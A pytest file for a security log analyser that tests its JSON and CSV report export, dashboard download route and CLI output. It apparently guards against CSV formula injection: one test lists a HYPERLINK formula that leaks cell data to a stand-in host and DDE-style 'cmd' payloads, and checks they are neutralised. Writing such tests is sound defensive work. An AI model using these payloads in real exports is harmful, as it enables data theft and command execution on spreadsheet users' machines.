"""Exporting findings: the report format, the dashboard download and the CLI."""

import csv
import io
import json
import os
import random
import subprocess
import sys
from datetime import datetime

import pytest

from analyzer.report import FIELDS, build_report, to_csv, to_json
from web import app as app_module

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def _threat(evidence='5 failed logins', **extra):
    return {'threat_type': 'Brute Force Attack', 'severity': 'HIGH', 'ip': '198.51.100.9',
            'evidence': evidence, 'timestamp': datetime(2025, 1, 10, 3, 0), 'count': 5,
            'technique': 'T1110.001', 'technique_name': 'Brute Force: Password Guessing',
            'tactic': 'Credential Access', 'mapping_confidence': 'confirmed', **extra}


def _report(threats):
    return build_report(threats, filename='auth.log', log_type='auth',
                        total_events=42, unique_ips=3)


class TestReportFormat:
    def test_carries_source_summary_and_findings(self):
        r = _report([_threat(), _threat(severity='CRITICAL')])
        assert r['source'] == {'filename': 'auth.log', 'log_type': 'auth',
                               'total_events': 42, 'unique_ips': 3}
        assert r['summary'] == {'total_findings': 2, 'by_severity': {'HIGH': 1, 'CRITICAL': 1}}
        assert set(r['findings'][0]) == set(FIELDS)

    def test_finding_fields(self):
        ioc = {'category': 'scanner-range', 'first_seen': '', 'range': '198.51.100.0/24'}
        f = _report([_threat(ioc_match=ioc)])['findings'][0]
        assert f['first_seen'] == '2025-01-10 03:00:00'
        assert (f['technique'], f['source']) == ('T1110.001', 'rule')
        assert (f['ioc_category'], f['ioc_range']) == ('scanner-range', '198.51.100.0/24')

    def test_json_round_trips(self):
        r = _report([_threat()])
        assert json.loads(to_json(r)) == r

    def test_csv_has_a_header_and_one_row_per_finding(self):
        rows = list(csv.reader(io.StringIO(to_csv(_report([_threat(), _threat()])))))
        assert rows[0] == FIELDS and len(rows) == 3


class TestCsvInjection:
    """
    Evidence quotes the attacker-written log. A cell starting with = + - @ or
    a tab / CR runs as a formula when the export is opened in a spreadsheet.
    """

    @pytest.mark.parametrize('payload', [
        '=HYPERLINK("http://evil.example/?leak="&A1,"click")',
        '+cmd|\' /C calc\'!A0',
        '-2+3+cmd|\' /C calc\'!A0',
        '@SUM(1+1)*cmd|\' /C calc\'!A0',
        '\t=1+1',
        '\r=1+1',
    ])
    def test_formula_cells_are_neutralised(self, payload):
        rows = list(csv.reader(io.StringIO(to_csv(_report([_threat(evidence=payload)])))))
        cell = rows[1][FIELDS.index('evidence')]
        assert cell == "'" + payload

    def test_ordinary_text_is_untouched(self):
        rows = list(csv.reader(io.StringIO(to_csv(_report([_threat()])))))
        assert rows[1][FIELDS.index('evidence')] == '5 failed logins'


@pytest.fixture
def client():
    app_module.app.config['TESTING'] = True
    return app_module.app.test_client()


@pytest.fixture
def analysed(client, tmp_path):
    """A real upload, so the export runs off a stored analysis."""
    import generate_sample_logs
    random.seed(42)
    path = tmp_path / 'web.log'
    generate_sample_logs.gen_web_log(str(path))
    with open(path, 'rb') as f:
        response = client.post('/analyze', data={'logfile': (f, 'access.log')},
                               content_type='multipart/form-data')
    assert response.status_code == 302
    with client.session_transaction() as sess:
        return client, sess['result_id']


class TestDashboardExport:
    def test_json_download(self, analysed):
        client, result_id = analysed
        r = client.get('/export?format=json')
        assert r.status_code == 200 and r.mimetype == 'application/json'
        assert r.headers['Content-Disposition'] == f'attachment; filename="seculog-{result_id}.json"'
        report = json.loads(r.get_data(as_text=True))
        assert report['summary']['total_findings'] == len(report['findings']) > 0
        assert report['source']['filename'] == 'access.log'

    def test_csv_download(self, analysed):
        client, _ = analysed
        r = client.get('/export?format=csv')
        assert r.status_code == 200 and r.mimetype == 'text/csv'
        rows = list(csv.reader(io.StringIO(r.get_data(as_text=True))))
        assert rows[0] == FIELDS and len(rows) > 1

    def test_by_result_id_without_a_session(self, analysed):
        _, result_id = analysed
        fresh = app_module.app.test_client()
        assert fresh.get(f'/export?result_id={result_id}').status_code == 200

    def test_dashboard_links_to_both_formats(self, analysed):
        client, result_id = analysed
        page = client.get('/dashboard').get_data(as_text=True)
        for fmt in ('json', 'csv'):
            assert f'/export?format={fmt}&amp;result_id={result_id}' in page

    def test_nothing_to_export(self, client):
        assert client.get('/export').status_code == 404

    def test_rejects_an_unknown_format(self, analysed):
        client, _ = analysed
        assert client.get('/export?format=xlsx').status_code == 400

    @pytest.mark.parametrize('result_id', ['../../package', 'C:/Windows/win', 'ABCDEF123456'])
    def test_result_id_is_validated_like_detail(self, client, result_id):
        assert client.get(f'/export?result_id={result_id}').status_code == 404


class TestUploadedFilename:
    def test_dashboard_shows_the_name_the_user_gave(self, analysed):
        """Uploads are stored as <uuid>_<name>; the prefix must not leak into results."""
        _, result_id = analysed
        assert app_module._load_results(result_id)['filename'] == 'access.log'


class TestCliFormats:
    @pytest.fixture
    def web_log(self, tmp_path):
        import generate_sample_logs
        random.seed(42)
        path = tmp_path / 'web.log'
        generate_sample_logs.gen_web_log(str(path))
        return str(path)

    def _run(self, *args):
        return subprocess.run([sys.executable, 'cli.py', 'analyze', *args], cwd=REPO_ROOT,
                              capture_output=True, text=True, encoding='utf-8', timeout=180)

    def test_json_goes_to_stdout_alone(self, web_log):
        result = self._run(web_log, '--format', 'json')
        assert result.returncode == 0, result.stderr
        report = json.loads(result.stdout)          # nothing but the report
        assert report['summary']['total_findings'] > 0
        assert '[1/4] Parsing' in result.stderr     # progress moved to stderr

    def test_csv_goes_to_stdout_alone(self, web_log):
        result = self._run(web_log, '--format', 'csv')
        assert result.returncode == 0, result.stderr
        assert result.stdout.splitlines()[0] == ','.join(FIELDS)

    def test_csv_line_endings_are_crlf_not_doubled(self, web_log):
        """Windows text-mode stdout used to turn each CRLF into CR CR LF."""
        raw = subprocess.run([sys.executable, 'cli.py', 'analyze', web_log, '--format', 'csv'],
                             cwd=REPO_ROOT, capture_output=True, timeout=180).stdout
        assert b'\r\r\n' not in raw
        assert raw.count(b'\r\n') == raw.count(b'\n') > 1

    def test_unparseable_file_still_gives_a_valid_report(self, tmp_path):
        junk = tmp_path / 'junk.log'
        junk.write_text('nothing parseable here\n')
        result = self._run(str(junk), '--format', 'json')
        assert result.returncode == 0
        assert json.loads(result.stdout)['summary']['total_findings'] == 0

    def test_text_output_is_unchanged(self, web_log):
        result = self._run(web_log)
        assert 'Threats Detected' in result.stdout and 'Evidence' in result.stdout
